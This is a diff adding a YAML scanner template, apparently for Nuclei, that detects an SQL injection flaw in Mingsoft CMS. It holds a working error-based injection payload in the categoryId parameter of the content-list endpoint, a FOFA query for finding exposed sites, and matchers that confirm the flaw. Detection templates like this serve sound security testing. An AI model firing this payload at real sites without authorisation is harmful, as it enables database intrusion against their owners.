@@ -1,0 +1,34 @@
+id: poc-yaml-mingsoft-cms-list-sqli
+info:
+  name: 铭飞CMS list SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    fingerprint: 铭飞CMS
+    fofa: |
+      body="铭飞MCMS" || body="/mdiy/formData/save.do" || body="static/plugins/ms/1.0.0/ms.js"
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cms/content/list?categoryId=1%27%20and%20updatexml(1,concat(0x7e,md5({{t1}}),0x7e),1)%20and%20%271"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "\"result\":false"
+        part: body
+      - type: word
+        words:
+          - "{{substr(t2, 0, 31)}}"
+        part: body
+      - type: word
+        words:
+          - "application/json"
+        part: header
